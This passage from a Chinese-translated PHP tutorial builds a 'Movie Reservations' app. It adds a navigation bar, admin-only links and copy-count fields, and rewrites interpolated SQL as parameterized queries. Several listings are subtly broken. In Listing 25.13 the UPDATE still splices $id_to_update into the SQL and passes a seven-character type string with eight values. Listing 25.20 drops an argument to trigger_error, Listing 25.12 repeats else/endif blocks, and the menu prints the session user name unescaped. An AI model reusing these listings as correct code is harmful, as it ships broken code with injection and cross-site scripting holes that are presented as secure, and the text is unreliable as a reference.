![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_392_0.png)

### 向 editmovie.php 添加导航栏

让我们向 editmovie.php 脚本添加导航栏。我们想要菜单看起来如图 24.13 所示。

> > 你需要以 access_privileges 设置为 admin 的用户身份登录才能测试此功能。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_392_1.png)

打开 pagetitles.php，并在 MR_ADD_MOVIE_PAGE 定义之后立即添加以下 MR_EDIT_MOVIE_PAGE 定义：

```
<?php
// Page Titles
// ...
define('MR_ADD_MOVIE_PAGE', 'Movie Reservations - Add Movie');
define('MR_EDIT_MOVIE_PAGE', 'Movie Reservations - Edit Movie');
```

### 向 editmovie.php 添加导航栏

打开 editmovie.php 脚本，并在包含 authorizeaccess.php 脚本之后，立即引入 pagetitles.php 脚本并将 $page_title 设置为 MR_EDIT_MOVIE_PAGE：

```
<?php
  require_once('authorizeaccess.php');
  require_once('pagetitles.php');
  $page_title = MR_EDIT_MOVIE_PAGE;
?>
<!DOCTYPE html>
<html>
```

这样做可以正确设置我们的 $page_title 变量，供 navmenu.php 使用，而 navmenu.php 是我们在包含 pagetitles.php 后所引入的。接下来，在 `<head>` 元素中，修改 `<title>` 元素，移除“编辑电影”并将其替换为 `$page_title`，如清单 24.10 所示。

### 清单 24.10.

```
1.  Unchanged Lines
2.  <html>
3.    <head>
4.    <link ...>
5. - Removed Line
6. -   <title>Edit a Movie</title>
7. + Added Line
8. +   <title><?= $page_title ?></title>
9. Unchanged Lines
10. </head>
11. <body>
12. ...
```

接下来，在 `<body>` 元素正下方，引入 navmenu.php 脚本：

```
<body>
<?php
  require_once('navmenu.php');
?>
  <div class="card">
  <div class="card-body">
```

由于我们引入了导航栏，让我们移除 `<h1>编辑电影</h1>` 正下方指向主页的链接。参见清单 24.11。

## 24. 添加导航菜单

### 清单 24.11.

```
1. Unchanged Lines
2.     <div class="card">
3.         <div class="card-body">
4.             <h1>Edit a Movie</h1>
5. - Removed Lines
6. -     <nav class="nav">
7. -         <a class="nav-link" href="index.php">Movies I Like</a>
8. -     </nav>
9. Unchanged Lines
10.     <hr/>
```

### 仅向管理员显示编辑链接

让我们回到 moviedetails.php 脚本中，添加一个条件，仅允许具有管理员权限的用户看到指向 editmovie.php 脚本的链接。从第二个闭合 `</div>` 标签之后的表格下方，添加清单 24.12 中第 4-7 行和第 13 行的代码。

### 清单 24.12.

```
1.         </table>
2.     </div>
3. </div>
4.     <?php
5.         if (isset($_SESSION['user_access_privileges'])
6.             && $_SESSION['user_access_privileges'] == 'admin'):
7. ?>
8. <hr/>
9. <p class='nav-link'>If you would like to change any of the details
10.     of this movie feel free to
11.     <a href='editmovie.php?id_to_edit=<?=$row['id'] ?>'> edit it</a></p>
12. <?php
13.     endif;
14.     else:
15. ?>
16. <h3>No Movie Details :-(</h3>
17. <?php
18.     endif;
19.     else:
20. ?>
21. <h3>No Movie Details :-(</h3>
22. <?php
23.     endif;
24. ?>
25.     </div>
26. </div>
27.     <script ...></script>
```

### 向 removemovie.php 添加导航栏

最后，我们将向 removemovie.php 脚本添加导航栏。我们想要菜单看起来如图 24.14 所示。

> 你需要以 access_privileges 设置为 admin 的用户身份登录才能测试此功能。

打开 pagetitles.php，并在 MR_EDIT_MOVIE_PAGE 定义之后立即添加以下 MR_REMOVE_MOVIE_PAGE 定义：

```
<?php
// Page Titles
// ...
define('MR_EDIT_MOVIE_PAGE', 'Movie Reservations - Edit Movie');
define('MR_REMOVE_MOVIE_PAGE', 'Movie Reservations - Remove Movie');
```

打开 removemovie.php 脚本，并在包含 authorizeaccess.php 脚本之后，立即引入 pagetitles.php 脚本并将 $page_title 设置为 MR_REMOVE_MOVIE_PAGE：

```
<?php
require_once('authorizeaccess.php');
require_once('pagetitles.php');
$page_title = MR_REMOVE_MOVIE_PAGE;
?>
<!DOCTYPE html>
<html>
```

这样可以正确设置我们的 $page_title 变量，供 navmenu.php 使用，而 navmenu.php 是我们在包含 pagetitles.php 后所引入的。接下来，在 `<head>` 元素中，修改 `<title>` 元素，移除文本“移除电影”并将其替换为 `$page_title`（参见清单 24.13）。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_395_0.png)

## 24. 添加导航菜单

### 清单 24.13.

```
1.  Unchanged Lines
2.  ...
3.  <html>
4.      <head>
5.      <link ...>
6.  - Removed Line
7.  -   <title>Remove a Movie</title>
8.  + Added Line
9.  +   <title><?= $page_title ?></title>
10. Unchanged Lines
11.     </head>
12.     <body>
13.     ...
```

接下来，在 `<body>` 元素正下方，引入 navmenu.php 脚本：

```
<body>
<?php
    require_once('navmenu.php');
?>
    <div class="card">
    <div class="card-body">
```

### 完整代码清单

清单 24.14 是 pagetitles.php 页面的完整代码。

### 清单 24.14.

```
1. <?php
2. // Page Titles
3. define('MR_HOME_PAGE', 'Movie Reservations');
4. define('MR_DETAILS_PAGE', 'Movie Reservations - Details');
5. define('MR_SIGNUP_PAGE', 'Movie Reservations - Sign Up');
6. define('MR_LOGIN_PAGE', 'Movie Reservations - Login');
7. define('MR_UNAUTHORIZED_ACCESS_PAGE', 'Movie Reservations - Unauthorized Access');
8. define('MR_ADD_MOVIE_PAGE', 'Movie Reservations - Add Movie');
9. define('MR_EDIT_MOVIE_PAGE', 'Movie Reservations - Edit Movie');
10. define('MR_REMOVE_MOVIE_PAGE', 'Movie Reservations - Remove Movie');
```

清单 24.15 是 navmenu.php 页面的完整代码。

### 清单 24.15.

```php
<?php
$page_title = isset($page_title) ? $page_title : "";

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}
?>
<nav class="navbar sticky-top navbar-expand-md navbar-dark"
    style="background-color: #569f32;">
   <a class="navbar-brand" href="<?= dirname($_SERVER['PHP_SELF']) ?>?">
       <img src="resources/movie_rental_icon.png" width="30" height="30"
            class="d-inline-block align-top" alt="">
       <?= MR_HOME_PAGE ?>
   </a>
   <button class="navbar-toggler" type="button" data-toggle="collapse"
           data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup"
           aria-expanded="false" aria-label="Toggle navigation">
       <span class="navbar-toggler-icon"></span>
   </button>
   <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
       <div class="navbar-nav">
           <a class="nav-item nav-link<?= $page_title == MR_HOME_PAGE ? ' active' : '' ?>"
              href="<?= dirname($_SERVER['PHP_SELF']) ?>">Home </a>
           <?php if (isset($_SESSION['user_access_privileges'])
               && $_SESSION['user_access_privileges'] == 'admin'): ?>
               <a class="nav-item nav-link<?= $page_title == MR_ADD_MOVIE_PAGE ? ' active' : '' ?>"
                  href="addmovie.php">Add a Movie</a>
           <?php endif; ?>
           <?php if (!isset($_SESSION['user_name'])): ?>
               <a class="nav-item nav-link<?= $page_title == MR_LOGIN_PAGE ? ' active' : '' ?>"
                  href="login.php">Login</a>
               <a class="nav-item nav-link<?= $page_title == MR_SIGNUP_PAGE ? ' active' : '' ?>"
                  href="signup.php">Sign Up</a>
           <?php else: ?>
               <a class="nav-item nav-link"
                  href="logout.php">Logout (<?= $_SESSION['user_name'] ?>)</a>
           <?php endif; ?>
       </div>
   </div>
</nav>
```




## 练习
- 1. 创建 `navmenu.php` 脚本来保存 Navbar 逻辑并将其添加到所需的页面中。
  - 1. 在导航栏中，在登录链接旁边显示已登录用户的姓名。
- 2. 添加仅管理员用户可用的“Add Movie”链接。
  - 1. 确认管理员用户可以看到该链接。
  - 2. 确认普通网站用户看不到该链接。

## 章节
## 25
## 添加预订功能

> “对于所有对我的名言感到兴奋的人们。这里再来一句 - 是的，我是个糟糕的程序员，但我可能仍然比你好 :)”
> 
> -Rasmus Lerdorf

## 25. 添加预订功能

最后，我们准备好为我们的 *Movie Reservations* 应用添加电影预订功能。本章将重点介绍为 *Movie Reservations* 应用添加预订功能，以便用户可以预订和归还电影。再次，这里是我们需要做的修改列表，以便最终将 *Movie Listing* 应用转变为 *Movie Reservations* 应用：

- 1. **添加预订功能**
  - 1. 创建一个数据库表来保存电影预订信息
  - 2. 向 `movieListing` 数据库表添加字段，以跟踪每部电影的副本数量和已预订电影
  - 3. 修改添加、编辑、删除和电影详情脚本以包含电影的副本数量
  - 4. 修改电影列表页面，为已登录用户显示预订电影的链接
  - 5. 修改电影列表页面，为具有管理员权限的登录用户显示删除电影的链接
  - 6. 添加预订脚本供用户借出电影
  - 7. 添加购物车脚本，允许用户在购物车中预订电影并将其从购物车中移除
  - 8. 添加购物车图标，允许用户查看其购物车
  - 9. 添加已预订电影脚本，允许用户归还电影
  - 10. 添加预订图标，允许用户查看其预订

### 添加副本数量和已预订数量

为了将我们的电影列表应用转变为电影预订应用，我们需要知道我们拥有的电影标题的副本数量以及其中有多少副本已被预订。我们将修改数据库并添加电影借阅功能。

### 添加副本数量和已预订数据库字段

让我们在 *Movie* 数据库中的 `movieListing` 表中添加两个字段。一个用于副本数量，另一个用于已预订数量。我们将使用 Adminer 来修改我们的表，如图 25.1 所示。

### 添加副本数量和已预订数量

选择 `image_file` 字段后的 +，在 `movieListing` 表末尾添加两个新字段。

对于 `number_of_copies` 字段：

- 在 `image_file` 下方的 **Column name** 中，输入 `number_of_copies`
- 选择“Type”为 int
- 为“Length”输入 **11**
- 勾选复选框并为“Default value”输入 **1**

对于 `number_reserved` 字段：

- 在 `number_of_copies` 下方的 **Column name** 中，输入 `number_reserved`
- 选择“Type”为 int
- 为“Length”输入 **11**
- 勾选复选框并为“Default value”输入 **0**

一旦你按下 **Save**，表描述应如下图 25.2 所示。现在我们 `movieListing` 表中的所有电影都将 `number_of_copies` 设为 1，而 `number_reserved` 设为 0，如图 25.3 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_401_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_401_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_401_2.png)

## 25. 添加预订功能

### 跟踪已添加电影的副本

我们需要在“Add a Movie”页面添加一个表单字段来设置我们想要添加的电影的副本数量。参见图 25.4。

打开 addmovie.php 脚本，并在“Movie Image File”表单字段下方添加一个 <div class="form-group row"> 用于“Number of Copies”，name 属性设为 movie_copies_number，如列表 25.1 所示。

### 列表 25.1.

```
```php
Unchanged Lines
...
<div class="form-group row">
<label for="movie_image_file"
    class="col-sm-3 col-form-label-lg">Movie Image File</label>
<div class="col-sm-8">
    <input type="file" class="form-control-file" id="movie_image_file"
        name="movie_image_file">

</div>
</div>
+ Added Lines
+   <div class="form-group row">
+   <label for="movie_copies_number"
        class="col-sm-3 col-form-label-lg">Number of Copies</label>
+   <div class="col-sm-8">
+       <input type="number" class="form-control" id="movie_copies_number"
        name="movie_copies_number" min="0" max="10" value="1">
+   </div>
+ </div>
Unchanged Lines
    </div>
    <button class="btn btn-primary" type="submit"
        name="add_movie_submission">Add Movie</button>
</form>
<script>
```
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_402_0.png)

图 25.4.

### 添加副本数量和已预订数量

现在让我们回到 // Initialization 注释下方并添加一行代码，将 $number_of_copies 默认设为 1，如列表 25.2 所示。

### 列表 25.2.

```
1.  Unchanged Lines
2.  ...
3.  <div class="card">
4.      <div class="card-body">
5.          <h1>Add a Movie</h1>
6.          <hr/>
7.          <?php
8.              // Initialization
9.              $display_add_movie_form = true;
10.             $movie_title = "";
11.             $movie_rating = "";
12.             $movie_director = "";
13.             $movie_runtime = "";
14.             $movie_genre_text = "";
15.             $checked_movie_genres = null;
16. + Added Line
17. +     $number_of_copies = 1;
18. Unchanged Lines
19. 
20.     $genres = [...];
```

接下来，在检查表单是否已提交的 if (isset($_POST[...],...)) 条件中，添加一个检查 $_POST['movie_copies_number'] 是否已设置的检查（列表 25.3）。

### 列表 25.3.

```
1.  Unchanged Lines
2.  ...
3.  $genres = [...];
4. 
5.  if (isset($_POST['add_movie_submission'], $_POST['movie_title'],
6.          $_POST['movie_rating'], $_POST['movie_director'],
7.          $_POST['movie_running_time_in_minutes']
8. + Added Line
9. +     , $_POST['movie_copies_number']
10. Unchanged Lines
11.     ))
12. {
13.     require_once('dbconnection.php');
14.     ...
```

## 25. 添加预订功能

在此 if() 条件内，在设置 $checked_movie_genres 之后，添加一行代码将 $number_of_copies 设为 $_POST['movie_copies_number'] 并将其强制转换为 (int)。强制转换确保我们正在处理一个有效数字，而不是像 "100 movies" 这样的随机用户提供的字符串。

### 列表 25.4.

```
1. Unchanged Lines
2.   if (isset($_POST[...],...))
3.   {
4.   ...
5.   $movie_runtime = $_POST['movie_running_time_in_minutes'];
6.   $checked_movie_genres = $_POST['movie_genre_checkbox'];
7. + Added Line
8. +   $number_of_copies = (int) $_POST['movie_copies_number'];
9. Unchanged Lines
10.  
11.  $movie_genre_text = "";
```

我们需要将所有数据库查询修改为参数化查询，因此我们需要包含 queryutils.php 脚本。在代码中更下方一点，在检查没有文件错误消息的条件内（if (empty($file_error_message)))，在打开的大括号 ({) 之后立即添加以下代码行：

### 列表 25.5.

```
1. Unchanged Lines
2.   ...
3.   if (empty($file_error_message))
4.   {
5. + Added Line
6. +   require_once('queryutils.php');
7. +
8. Unchanged Lines
9.   $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
10.   or trigger_error(
11.   'Error connecting to MySQL server for ' . DB_NAME, E_USER_ERROR
12.   );
```

### 添加副本数量和已预订数量

我们需要修改向 movieListing 表插入的 SQL 以使用 number_of_copies 字段。我们还需要将其更改为如列表 25.6 中所示的参数化查询。最后，我们需要在添加电影后向我们的表中添加一行以显示“number of copies”字段的值，如图 25.5 所示

### 列表 25.6.

```
```php
1. Unchanged Lines
2.
3. if (empty($file_error_message))
4. {
5. ...
6. $movie_image_file_path = addMovieImageFileReturnPathLocation();
7.
8. - Removed Lines
9. - $query = "INSERT INTO movielisting (title, rating, director, running_time_in_minutes, "
10. - . "genre, image_file) VALUES ('$movie_title', '$movie_rating', '$movie_director', "
11. - . "'$movie_runtime', '$movie_genre_text', '$movie_image_file_path')";
12. -
13. - mysqli_query($dbc, $query)
14. - or trigger_error('Error querying database movielisting: Failed to insert movie listing',
15. - E_USER_ERROR);
16. + Added Lines
17. + $query = "INSERT INTO movielisting (title, rating, director, running_time_in_minutes, "
18. + . "genre, image_file, number_of_copies) VALUES (?, ?, ?, ?, ?, ?, ?)";
19. +
20. + $results = parameterizedQuery($dbc, $query, 'ssssssi', $movie_title, $movie_rating,
21. + $movie_director, $movie_runtime, $movie_genre_text, $movie_image_file_path,
22. + $number_of_copies);
23. +
24. + if (mysqli_errno($dbc))
25. + {
26. + trigger_error('Error querying database movielisting', E_USER_ERROR);
27. + }
28. Unchanged Lines
29.
30. if (empty($movie_image_file_path))
31. {
32. $movie_image_file_path = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
33. }
```
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_405_0.png)



## 25. 添加预订功能

在表格末尾添加一行 HTML 表格行，显示我们添加的电影的副本数量，如清单 25.7 所示

清单 25.7.

```
1. Unchanged Lines
2. ...
3.   <table class="table table-striped">
4.     <tbody>
5.     ...
6.     <tr>
7.       <th scope="row">Running Time (minutes)</th>
8.       <td><?= $movie_runtime ?></td>
9.     </tr>
10.    <tr>
11.      <th scope="row">Genre</th>
12.      <td><?= $movie_genre_text ?></td>
13.    </tr>
14. + Added Lines
15. +   <tr>
16. +     <th scope="row">Number of Copies</th>
17. +     <td><?= $number_of_copies ?></td>
18. +   </tr>
19. Unchanged Lines
20.    </tbody>
21.  </table>
```

> 您需要以具有管理员权限的用户身份登录来测试此功能。

### 在编辑页面添加副本数量

让我们在“Edit a Movie”页面添加一个表单字段，以设置我们正在编辑的电影的副本数量。参见图 25.6。

打开 editmovie.php 脚本，并在“Movie Image File”表单字段下方添加一个用于“Number of Copies”的 `<div class="form-group row">`，name 属性设置为 `movie_copies_number`，如清单 25.8 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_406_0.png)

清单 25.8.

```
1. Unchanged Lines
2. ...
3. <div class="form-group row">
4.   <label for="movie_image_file"
5.     class="col-sm-3 col-form-label-lg">Movie Image File</label>
6.   <div class="col-sm-8">
7.     <input type="file" class="form-control-file" id="movie_image_file"
8.       name="movie_image_file">
9.   </div>
10. </div>
11. + Added Lines
12. +   <div class="form-group row">
13. +   <label for="movie_copies_number"
14. +     class="col-sm-3 col-form-label-lg">Number of Copies</label>
15. +   <div class="col-sm-8">
16. +     <input type="number" class="form-control" id="movie_copies_number"
17. +       name="movie_copies_number" min="0" max="10" value="1">
18. +   </div>
19. + </div>
20. Unchanged Lines
21.   </div>
22.   <button class="btn btn-primary" type="submit"
23.     name="add_movie_submission">Add Movie</button>
24. </form>
25. <script>
26. ...
```

我们需要修改所有对数据库的查询，使其参数化并包含 queryutils.php 脚本。回到包含 dbconnection.php 和 movieimagefileutil.php 的位置，并添加对 queryutils.php 的包含：

```
<?php
require_once('dbconnection.php');
require_once('movieimagefileutil.php');
require_once('queryutils.php');
```

现在向下找到第一个查询的构造，该查询位于 `if (isset($_GET['id_to_edit']))` 条件内，用于选择 movieListing 的所有字段：

```
if (isset($_GET['id_to_edit']))
{
    // ...
    $query = "SELECT * FROM movieListing WHERE id = $id_to_edit";
    // ...
}
```

按清单 25.9 所示进行修改。

清单 25.9.

```
1. Unchanged Lines
2.     if (isset($_GET['id_to_edit']))
3.     {
4.         $id_to_edit = $_GET['id_to_edit'];
5. - Removed Lines
6. -     $query = "SELECT * FROM movieListing WHERE id = $id_to_edit";
7. -
8. -     $result = mysqli_query($dbc, $query)
9. -         or trigger_error('Error querying database movieListing', E_USER_ERROR);
10. + Added Lines
11. +     $query = "SELECT * FROM movieListing WHERE id = ?";
12. +
13. +     $result = parameterizedQuery($dbc, $query, 'i', $id_to_edit)
14. Unchanged Lines
15.     if (mysqli_num_rows($result) == 1)
16.     {
```

在 `if (mysqli_num_rows($result) == 1)` 条件内，在设置 `$movie_image_file` 之后添加一行代码，将 `$number_of_copies` 设置为 `$row['number_of_copies']`。这样做会在编辑表单上显示 `number_of_copies` 的存储值（清单 25.10）。

清单 25.10.

```
1. Unchanged Lines
2.     if (mysqli_num_rows($result) == 1)
3.     {
4.         $row = mysqli_fetch_assoc($result);
5.
6.         $movie_title = $row['title'];
7.         ...
8.         $movie_image_file = $row['image_file'];
9. + Added Line
10. +     $number_of_copies = $row['number_of_copies'];
11. Unchanged Lines
12.
13.     if (empty($movie_image_file))
14.     {
```

接下来，在清单 25.11 所示的用于检查表单是否已提交的 `elseif (isset($_POST[...],...))` 条件中，添加对 `$_POST['movie_copies_number']` 的检查。

清单 25.11.

```
1. Unchanged Lines
2. ...
3. elseif (isset($_POST['add_movie_submission'], $_POST['movie_title'],
4. $_POST['movie_rating'], $_POST['movie_director'],
5. $_POST['movie_running_time_in_minutes']
6. + Added Line
7. + , $_POST['movie_copies_number']
8. Unchanged Lines
9. ))
10. {
11. $movie_title = $_POST['movie_title'];
```

在此 `elseif()` 条件内，在设置 `$movie_image_file` 之后（清单 25.12），添加一行代码将 `$number_of_copies` 设置为 `$_POST['movie_copies_number']` 并将其强制转换为 `(int)`。现在，`$number_of_copies` 持有用户提交的更新值。

清单 25.12.

```
1. Unchanged Lines
2. elseif (isset($_POST[...],...))
3. {
4. $movie_title = $_POST['movie_title'];
5. ...
6. $movie_image_file = $_POST['movie_image_file'];
7. + Added Line
8. + $number_of_copies = (int)$_POST['movie_copies_number'];
9. Unchanged Lines
10.
11. $movie_genre_text = "";
```

最后，在 `if (empty($file_error_message))` 内，在检查是否选择了新图像文件的条件之后，进行以下修改（清单 25.13），以将对 movieListing 表的 UPDATE 参数化。

清单 25.13.

```
1. Unchanged Lines
2. if (empty($file_error_message))
3. {
4.     $movie_image_file_path = addMovieImageFileReturnPathLocation();
5. 
6.     // IF new image selected, set it to be updated in the database.
7.     if (!empty($movie_image_file_path))
8.     {
9.         ...
10. 
11.         $movie_image_file = $movie_image_file_path;
12.     }
13. 
14. - Removed Lines
15. -     $query = "UPDATE movielisting SET title = '$movie_title', rating = '$movie_rating', "
16. -         ."director = '$movie_director', running_time_in_minutes = '$movie_runtime', "
17. -         ."genre = '$movie_genre_text', image_file = '$movie_image_file' "
18. -         ."WHERE id = $id_to_update";
19. - 
20. -     mysqli_query($dbc, $query)
21. -         or trigger_error(
22. -         'Error querying database movielisting: Failed to update movie listing',
23. -         E_USER_ERROR
24. -     );
25. + Added Lines
26. +     $query = "UPDATE movielisting SET title = ?, rating = ?, director = ?,
27. +             running_time_in_minutes = ?, genre = ?, image_file = ?,
28. +             number_of_copies = ?
29. +             WHERE id = $id_to_update";
30. +     parameterizedQuery($dbc, $query, 'sssssii', $movie_title, $movie_rating,
31. +                     $movie_director, $movie_runtime, $movie_genre_text,
32. +                     $movie_image_file, $number_of_copies, $id_to_update);
33. + 
34. +     if(mysqli_errno($dbc))
35. +     {
36. +         trigger_error(
37. +         'Error querying database movielisting: Failed to update movie listing',
38. +         E_USER_ERROR
39. +     );
40. +     }
41. Unchanged Lines
42. 
43.     $nav_link = 'moviedetails.php?id=' . $id_to_update;
```

### 在删除电影页面添加副本数量

让我们在“Remove a Movie”页面添加一行以显示副本数量，如图 25.7 所示。

打开 `removemovie.php` 脚本。我们需要将所有对数据库的查询修改为参数化查询，因此需要包含 `queryutils.php` 脚本。在 `movieimagefileutil.php` 的包含语句正下方添加 `require_once('queryutils.php');`，如清单 25.14 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_411_0.png)

清单 25.14.

```
1. Unchanged Lines
2. ...
3.     require_once('dbconnection.php');
4.     require_once('movieimagefileutil.php');
5. + Added Line
6. +     require_once('queryutils.php');
7. Unchanged Lines
8. 
9.     $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
10.         or trigger_error(
11.             'Error connecting to MySQL server for ' . DB_NAME,
12.             E_USER_ERROR
13.         );
```

接下来，我们将位于 `if (isset($_POST['delete_movie_submission']))...):` 条件内的图像文件查询参数化（清单 25.15）。

清单 25.15.

```
1. Unchanged Lines
2. ...
3.     if (isset($_POST['delete_movie_submission']) && isset($_POST['id'])):
4. 
5.         $id = $_POST['id'];
6. 
7.         // Query image file from DB
8. - Removed Lines
9. -     $query = "SELECT image_file FROM movieListing WHERE id = $id";
10. - 
11. -     $result = mysqli_query($dbc, $query)
```


## 25. 添加预订功能

```
12. + Added Lines
13. +     $query = "SELECT image_file FROM movieListing WHERE id = ?";
14. +
15. +     $result = parameterizedQuery($dbc, $query, 'i', $id)
16. Unchanged Lines
17.         or trigger_error('Error querying database movieListing', E_USER_ERROR);
18.
19.     if (mysqli_num_rows($result) == 1)
20.     {
21.         //...
22.     }
```

现在，让我们按照清单 25.16，将数据库中电影的删除操作参数化。

### 清单 25.16.

```
1. Unchanged Lines
2.     ...
3.     if (mysqli_num_rows($result) == 1)
4.     {
5.         ...
6.     }
7. - Removed Lines
8. -     $query = "DELETE FROM movieListing WHERE id = $id";
9. -
10. -     $result = mysqli_query($dbc, $query)
11. + Added Lines
12. +     $query = "DELETE FROM movieListing WHERE id = ?";
13. +
14. +     $result = parameterizedQuery($dbc, $query, 'i', $id)
15. Unchanged Lines
16.         or trigger_error('Error querying database movieListing', E_USER_ERROR);
17.
18.     header("Location: " . dirname($_SERVER['PHP_SELF']));
19.
20.     elseif (isset($_POST['do_not_delete_movie_submission'])):
```

在下面的 elseif (isset($_GET['id_to_delete'])): 条件中，按照清单 25.17 所示进行修改，以参数化查询该电影。

### 添加副本数量和已预订数量

### 清单 25.17.

```
1. Unchanged Lines
2.     elseif (isset($_GET['id_to_delete'])):
3. ?>
4.     <h3 class="text-danger">Confirm Deletion of the Following Movie:</h3><br/>
5. <?php
6.     $id = $_GET['id_to_delete'];
7. 
8. - Removed Lines
9. -     $query = "SELECT * FROM movieListing WHERE id = $id";
10. - 
11. -     $result = mysqli_query($dbc, $query)
12. + Added Lines
13. +     $query = "SELECT * FROM movieListing WHERE id = ?";
14. + 
15. +     $result = parameterizedQuery($dbc, $query, 'i', $id)
16. Unchanged Lines
17.     or trigger_error('Error querying database movieListing', E_USER_ERROR);
18. 
19.     if (mysqli_num_rows($result) == 1)
20.     {
21.     ...
```

最后，在“类型”行的正下方，添加一个用于显示副本数量的 HTML 表格行，其表格数据设置为 $row['number_of_copies']。参见清单 25.18。

### 清单 25.18.

```
1. Unchanged Lines
2. <table class="table table-striped">
3.     <tbody>
4.         <tr>
5.             <th scope="row">Rating</th>
6.             <td><?= $row['rating'] ?></td>
7.         </tr>
8.         ...
9.         <tr>
10.            <th scope="row">Genre</th>
11.            <td><?= $row['genre'] ?></td>
12.        </tr>
13. + Added Lines
14. +     <tr>
15. +         <th scope="row">Number of Copies</th>
16. +         <td><?= $row['number_of_copies'] ?></td>
17. +     </tr>
18. Unchanged Lines
19.     </tbody>
20. </table>
```

## 25. 添加预订功能

### 向电影详情添加副本数量和可用数量

我们将为“电影详情”页面添加一行，显示可用数量和库存数量。见图 25.8。

> 你需要以管理员权限登录才能看到库存数量。

打开 moviedetails.php 脚本。我们需要修改该电影的数据库查询以使其参数化，因此需要包含 queryutils.php 脚本。在 if (isset($_GET['id'])) 条件中，紧挨着 movielistingfileconstants.php 包含语句的下方，按清单 25.19 添加 require_once('queryutils.php');。

### 清单 25.19.

```
1. Unchanged Lines
2. ...
3. if (isset($_GET['id'])):
4.
5.     require_once('dbconnection.php');
6.     require_once('movielistingfileconstants.php');
7. + Added Line
8. +     require_once('queryutils.php');
9. Unchanged Lines
10.
11.
12.     $id = $_GET['id'];
13.
14.     $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
15.         or trigger_error(
16.         'Error connecting to MySQL server for ' . DB_NAME,
17.         E_USER_ERROR
18.         );
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_414_0.png)

接下来，参数化电影详情的查询（清单 25.20）。

### 添加副本数量和已预订数量

### 清单 25.20.

```
1. Unchanged Lines
2. ...
3. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
4.     or trigger_error(
5.     'Error connecting to MySQL server for' . DB_NAME,
6. 
7.     );
8. 
9. - Removed Lines
10. - $query = "SELECT * FROM movielisting WHERE id = $id";
11. - 
12. - $result = mysqli_query($dbc, $query)
13. + Added Lines
14. + $query = "SELECT * FROM movielisting WHERE id = ?";
15. + 
16. + $result = parameterizedQuery($dbc, $query, 'i', $id)
17. Unchanged Lines
18.     or trigger_error('Error querying database movielisting', E_USER_ERROR);
19. 
20. if (mysqli_num_rows($result) == 1)
21. {
22.     ...
23. }
```

然后，按照清单 25.21，在“类型”行正下方添加一个用于显示可用数量的表格行，其表格数据设置为 $row['number_of_copies'] - $row['number_reserved']。

### 清单 25.21.

```
1. Unchanged Lines
2. ...
3. <table class="table table-striped">
4.     <tbody>
5.         <tr>
6.             <th scope="row">Rating</th>
7.             <td><?= $row['rating'] ?></td>
8.         </tr>
9.         ...
10.        <tr>
11.            <th scope="row">Genre</th>
12.            <td><?= $row['genre'] ?></td>
13.        </tr>
14. + Added Lines
15. +     <tr>
16. +         <th scope="row">Number of Copies</th>
17. +         <td><?= $row['number_of_copies'] - $row['number_reserved'] ?></td>
18. +     </tr>
19. Unchanged Lines
20.     </tbody>
21. </table>
```

## 25. 添加预订功能

最后，在新增的副本数量表格行的正下方，添加一个库存数量行，当用户具有管理员权限时显示该行。参见清单 25.22。

### 清单 25.22.

```
1. Unchanged Lines
2.   <table class="table table-striped">
3.     <tbody>
4.       <tr>
5.         <th scope="row">Rating</th>
6.         <td><?= $row['rating'] ?></td>
7.       </tr>
8.       ...
9.       <tr>
10.        <th scope="row">Genre</th>
11.        <td><?= $row['genre'] ?></td>
12.      </tr>
13.      <tr>
14.        <th scope="row">Number of Copies</th>
15.        <td><?= $row['number_of_copies'] - $row['number_reserved'] ?></td>
16.      </tr>
17. + Added Lines
18. + <?php
19. +     if (isset($_SESSION['user_access_privileges'])
20. +         && $_SESSION['user_access_privileges'] == 'admin'):
21. + ?>
22. +     <tr>
23. +         <th scope="row">Number in Inventory</th>
24. +         <td><?= $row['number_of_copies'] ?></td>
25. +     </tr>
26. + <?php
27. + endif;
28. + ?>
29. Unchanged Lines
30.     </tbody>
31.     </table>
```

### 持久化用户的电影预订

既然现在我们可以跟踪可用和已预订的电影数量，就需要向 Movie 数据库添加一张表，用于跟踪某个用户预订的所有电影。因此，我们需要一张表示用户与电影之间多对多[1]关系的表，也就是所谓的“联接”表。

联接表包含来自两个或多个表的公共字段，通常是 ID 字段。这些字段被设置为外键，指向其代表表中的所选行。在这种情况下，我们希望将 user 表与 movieListing 表关联起来，并使这种关系表示预订。外键通常采用“表字段名 + 表的主键名”的命名方式。因此，如果我们创建一个名为 reservation 的表，并将通常的主键设为 id，它将具有以下外键：

| 字段名 | 用途 |
|---|---|
| id | 主键 |
| user_id | 外键 |
| movieListing_id | 外键 |

在 Adminer（图 25.9）中，在 Movie 数据库中创建一个名为 reservation 的表，属性如下：

| 列名 | 类型 | 长度 | 自动递增 |
|---|---|---|---|
| id | int | 11 | 是 |
| user_id | int | 11 | 否 |
| movieListing_id | int | 11 | 否 |

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_417_0.png)

[1] 多对多: https://phpa.me/sql-many-to-many

## 25. 添加预订功能

### 检查用户已预订的电影

我们需要知道用户是否已预订某部电影，以及用户已预订的电影数量。由于我们经常执行这些查询，因此在 queryutils.php 脚本中创建函数是合理的。

### 创建 IsMovieReservedByUser() 函数

